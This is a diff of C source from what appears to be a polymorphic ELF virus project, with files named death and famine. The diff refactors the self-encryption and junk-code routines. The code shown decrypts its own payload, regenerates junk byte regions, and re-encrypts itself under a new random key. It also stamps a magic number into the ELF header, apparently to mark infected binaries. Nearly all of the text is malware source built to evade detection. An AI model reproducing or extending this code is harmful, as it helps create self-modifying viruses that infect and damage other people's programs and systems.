@@ -1,20 +1,19 @@
 #include <sys/mman.h>
 #include <sys/stat.h>
 #include <fcntl.h>
-#include <unistd.h>
+//#include <unistd.h>
 
 #include "utils.h"
 #include "death.h"
 #include "data.h"
 #include "famine.h"
-#include "encrypt.h"
+#include "crypt.h"
 #include "syscall.h"
 
 extern void __attribute__((naked)) _start(void);
 extern void real_end(void);
 extern bool g_is_encrypted;
 extern int g_start_offset;
-//extern int64_t g_key;
 extern uint8_t g_key[KEY_SIZE];
 extern void real_start(void);
 
@@ -284,23 +283,6 @@ static void replace_nop(uint8_t *self, int *junk_offsets) {
 	}
 }
 
-static void replace_nop_encrypt(uint8_t *self, int *junk_offsets, uint8_t *key) {
-
-	uint16_t dummy_offset	= (uintptr_t)&real_start - (uintptr_t)&_start;
-
-	for (size_t i = 0; i < g_nb_junk; i++) {
-
-		uint8_t rdm_junk[JUNK_LEN];
-
-		gen_junk(rdm_junk, junk_offsets[i]);
-
-		encrypt_offset(rdm_junk, JUNK_LEN, key, junk_offsets[i] - dummy_offset);
-
-		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);
-
-	}
-}
-
 int make_writeable(uint8_t *self, size_t size) {
 
 	if (g_start_offset == ORIG_TEXT_OFF && g_is_encrypted == true) {
@@ -359,17 +341,13 @@ static void write_self_pos(uint8_t *entry) {
 static uint8_t* encrypt_self(uint8_t *entry) {
 
 	/* encrypt self */
-	//uintptr_t key_pos = (uintptr_t)&g_key - (uintptr_t)&_start;
 	uint8_t *key = (uint8_t *)(entry + G_KEY_OFF);
 	getrandom(key, KEY_SIZE, 0);
 
 	encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
 
-	//uintptr_t is_encrypted = (uintptr_t)&g_is_encrypted - (uintptr_t)&_start;
 	uint8_t *enc = (uint8_t *)(entry + G_IS_ENCRYPTED_OFF);
-	//ft_memcpy(enc, (const void *)&(bool){true}, sizeof(bool));
 	*enc = true; JUNK;
-
 
 	return key;
 }
@@ -388,12 +366,10 @@ int death(saved_vars_t *vars, file_t *file) {
 		decrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, vars->key);
 		replace_nop(entry, g_junk_offsets);
 		encrypt(entry + PACKER_SIZE, PAYLOAD_SIZE, key);
-		//replace_nop_encrypt(entry, g_junk_offsets, vars->key);
 	} else { // only for the first run of the main prog (like fill_offsets)
 		write_self_pos(entry);
 		replace_nop(entry, g_junk_offsets);
 		encrypt_self(entry);
-		//replace_nop_encrypt(entry, g_junk_offsets, new_key);
 		*(uint32_t *)(Elf64_Ehdr *)(self + EI_PAD) = MAGIC_NUMBER; JUNK;
 	}
 
